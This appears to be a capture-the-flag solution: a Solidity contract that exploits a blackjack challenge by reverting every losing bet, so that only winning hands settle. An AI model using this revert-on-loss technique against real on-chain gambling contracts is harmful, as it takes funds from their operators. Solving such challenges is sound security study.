pragma solidity ^0.8.0;
import {IBlackJack} from "./IBlackJack.sol";
import {Challenge} from "./Challenge.sol";

contract SkillBasedGameExploit {
    Challenge challenge;

    constructor(address challenge_) {
        challenge = Challenge(challenge_);
    }

    function bet() public payable {
        IBlackJack jack = IBlackJack(payable(challenge.BLACKJACK()));
        uint256 beforeBalance = address(this).balance;
        jack.deal{value: 5 ether}();
        jack.stand();
        uint256 afterBalance = address(this).balance;
        require(afterBalance > beforeBalance, "bet lose");
    }

    receive() external payable {}
}
